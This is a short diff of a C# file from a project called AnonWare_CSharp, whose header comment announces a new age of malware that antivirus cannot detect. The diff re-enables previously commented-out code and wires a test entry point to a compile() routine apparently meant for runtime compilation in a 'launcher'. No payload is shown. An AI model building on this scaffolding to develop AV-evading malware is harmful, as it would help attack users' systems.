@@ -1,4 +1,6 @@
-﻿
+﻿//this code is just like a little playground where you make the code before putting it into the 'first launcher' this code does absolutely nothing before you put it into Program.cs
+
+
 /*  Welcome to a New age of malware...
  *
  *  One where AV software can't pick out the latest strain of malware,
@@ -9,7 +11,6 @@
  *  Expect US.
  */
 
-/*
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -27,10 +28,9 @@ namespace AnonWare_CSharp
 {
     class regProgram
     {
-        static void Main()
+        static void MainTest()
         {
-            Console.WriteLine("HI!");
-            Console.ReadLine();
+            compile();
         }
         public static string watsdasource;
         static void compile()
@@ -98,5 +98,3 @@ namespace AnonWare_CSharp
         }
     }
 }
-
-*/
